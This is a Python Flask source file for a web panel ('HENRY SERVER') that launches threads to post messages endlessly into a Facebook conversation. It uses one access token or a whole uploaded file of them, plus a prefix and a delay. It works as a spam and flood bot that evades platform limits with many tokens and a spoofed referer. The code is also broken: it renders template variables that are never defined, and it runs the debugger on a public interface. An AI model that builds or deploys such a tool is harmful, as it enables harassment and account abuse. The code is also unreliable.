from flask import Flask, request, render_template_string, redirect, jsonify
import threading
import requests
import time

app = Flask(__name__)
app.debug = True

active_threads = {}
thread_info = {}
thread_logs = {}  # ✅ हर thread के logs store करने के लिए

def log_message(thread_key, message):
    """ हर log को store करो ताकि modal में दिखाया जा सके """
    if thread_key not in thread_logs:
        thread_logs[thread_key] = []
    thread_logs[thread_key].append(message)
    if len(thread_logs[thread_key]) > 50:  # सिर्फ 50 latest logs रखो
        thread_logs[thread_key].pop(0)

def message_sender(access_token, thread_id, prefix, delay, messages, thread_key):
    headers = {'User-Agent': 'Mozilla/5.0','referer': 'https://google.com'}

    start_log = f"🚀 [NEW BOT STARTED] Thread: {thread_id}"
    print(start_log, flush=True)
    log_message(thread_key, start_log)

    thread_info[thread_key] = {
        'thread_id': thread_id,
        'token': access_token[:10] + "*****",
        'prefix': prefix,
        'status': 'running'
    }

    while active_threads.get(thread_key, {}).get("running", False):
        if active_threads[thread_key]["paused"]:
            time.sleep(1)
            continue
        for msg in messages:
            if not active_threads.get(thread_key, {}).get("running", False):
                break
            if active_threads[thread_key]["paused"]:
                break
            try:
                full_message = f"{prefix} {msg}"
                url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                payload = {'access_token': access_token, 'message': full_message}
                res = requests.post(url, data=payload, headers=headers)
                status = "✅ Sent" if res.status_code == 200 else f"❌ Fail ({res.status_code})"
                log_line = f"[{status}] {full_message}"
                print(log_line, flush=True)
                log_message(thread_key, log_line)
                time.sleep(delay)
            except Exception as e:
                err_line = f"[⚠️ ERROR] {e}"
                print(err_line, flush=True)
                log_message(thread_key, err_line)
                time.sleep(5)

    stop_log = f"🛑 [BOT STOPPED] Thread: {thread_id}"
    print(stop_log, flush=True)
    log_message(thread_key, stop_log)
    active_threads.pop(thread_key, None)
    thread_info.pop(thread_key, None)

@app.route('/', methods=['GET', 'POST'])
def home():
    if request.method == 'POST':
        mode = request.form.get('mode')
        thread_id = request.form.get('threadId')
        prefix = request.form.get('kidx')
        delay = int(request.form.get('time'))
        messages = request.files['txtFile'].read().decode().splitlines()

        if mode == 'single':
            token = request.form.get('accessToken')
            thread_key = f"{thread_id}_{token[:5]}"
            active_threads[thread_key] = {"running": True, "paused": False}
            thread = threading.Thread(target=message_sender, args=(token, thread_id, prefix, delay, messages, thread_key))
            thread.daemon = True
            thread.start()

        elif mode == 'multi':
            token_lines = request.files['tokenFile'].read().decode().splitlines()
            for token in token_lines:
                thread_key = f"{thread_id}_{token[:5]}"
                active_threads[thread_key] = {"running": True, "paused": False}
                thread = threading.Thread(target=message_sender, args=(token, thread_id, prefix, delay, messages, thread_key))
                thread.daemon = True
                thread.start()

        return redirect('/status')

    return render_template_string(form_html)

@app.route('/pause/<thread_key>', methods=['POST'])
def pause_thread(thread_key):
    if thread_key in active_threads:
        active_threads[thread_key]["paused"] = True
        thread_info[thread_key]["status"] = "paused"
    return redirect('/status')

@app.route('/resume/<thread_key>', methods=['POST'])
def resume_thread(thread_key):
    if thread_key in active_threads:
        active_threads[thread_key]["paused"] = False
        thread_info[thread_key]["status"] = "running"
    return redirect('/status')

@app.route('/stop/<thread_key>', methods=['POST'])
def stop_thread(thread_key):
    if thread_key in active_threads:
        active_threads[thread_key]["running"] = False
    return redirect('/status')

@app.route('/logs/<thread_key>')
def get_logs(thread_key):
    """ AJAX call के लिए logs भेजना """
    logs = thread_logs.get(thread_key, ["No logs available yet..."])
    return jsonify(logs)

@app.route('/status')
def status():
    form_html = '''
    <!DOCTYPE html>
    <html><head>
    <title>Status | HENRY SERVER</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&display=swap" rel="stylesheet">
    <style>
      body {
        background: linear-gradient(135deg, #1e1e2f, #2a0845);
        font-family: 'Orbitron', sans-serif;
        color: white;
        padding: 30px;
      }
      h2 { text-align: center; margin-bottom: 30px; text-shadow: 0 0 15px cyan; }
      .card {
        max-width: 600px;
        margin: 20px auto;
        background: rgba(255,255,255,0.08);
        border-radius: 15px;
        padding: 20px;
        box-shadow: 0 0 20px rgba(0,255,255,0.3);
      }
      .btn { padding: 6px 14px; border: none; border-radius: 8px; margin: 5px; cursor: pointer; }
      .btn-pause { background: orange; color: white; }
      .btn-resume { background: #00bfff; color: white; }
      .btn-stop { background: red; color: white; }
      .btn-logs { background: #7b2ff7; color: white; }
      .modal {
        display:none; position:fixed; top:0; left:0; width:100%; height:100%;
        background:rgba(0,0,0,0.6); display:flex; justify-content:center; align-items:center;
      }
      .modal-content {
        background:#111; padding:20px; border-radius:12px; width:80%; max-width:700px;
        max-height:80%; overflow:auto; color:#0f0; font-family:monospace;
        box-shadow:0 0 20px #0ff;
        animation: fadeIn 0.3s ease-in-out;
      }
      @keyframes fadeIn { from{opacity:0;transform:scale(0.9);} to{opacity:1;transform:scale(1);} }
      .close-btn { float:right; cursor:pointer; color:red; font-size:18px; }
    </style>
    </head><body>
    <h2>🚀 Active Threads</h2>
    {% if threads %}
      {% for key, info in threads.items() %}
        <div class="card">
          <p><strong>Status:</strong> {{ info.status }}</p>
          <p><strong>Thread ID:</strong> {{ info.thread_id }}</p>
          <p><strong>Prefix:</strong> {{ info.prefix }}</p>
          <form action="/pause/{{ key }}" method="post" style="display:inline;">
            <button class="btn btn-pause" type="submit">⏸ Pause</button>
          </form>
          <form action="/resume/{{ key }}" method="post" style="display:inline;">
            <button class="btn btn-resume" type="submit">▶ Resume</button>
          </form>
          <form action="/stop/{{ key }}" method="post" style="display:inline;">
            <button class="btn btn-stop" type="submit">🛑 Stop</button>
          </form>
          <button class="btn btn-logs" onclick="openLogs('{{ key }}')">📜 View Logs</button>
        </div>
      {% endfor %}
    {% else %}
      <p style="text-align:center;">No active threads running 🚫</p>
    {% endif %}

    <!-- Modal for logs -->
    <div id="logsModal" class="modal">
      <div class="modal-content">
        <span class="close-btn" onclick="closeLogs()">✖</span>
        <h3>📜 Live Logs</h3>
        <pre id="logsOutput">Loading...</pre>
      </div>
    </div>

    <script>
      let currentThreadKey = null;
      let logsInterval = null;

      function openLogs(threadKey) {
        currentThreadKey = threadKey;
        document.getElementById('logsModal').style.display = 'flex';
        fetchLogs();
        logsInterval = setInterval(fetchLogs, 2000);
      }

      function closeLogs() {
        document.getElementById('logsModal').style.display = 'none';
        clearInterval(logsInterval);
        currentThreadKey = null;
      }

      function fetchLogs() {
        if (!currentThreadKey) return;
        fetch('/logs/' + currentThreadKey)
          .then(response => response.json())
          .then(data => {
            document.getElementById('logsOutput').textContent = data.join("\\n");
            let pre = document.getElementById('logsOutput');
            pre.scrollTop = pre.scrollHeight;
          });
      }
    </script>
    </body></html>
    '''
    return render_template_string(status_html, threads=thread_info)


if __name__ == '__main__':
    import os
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
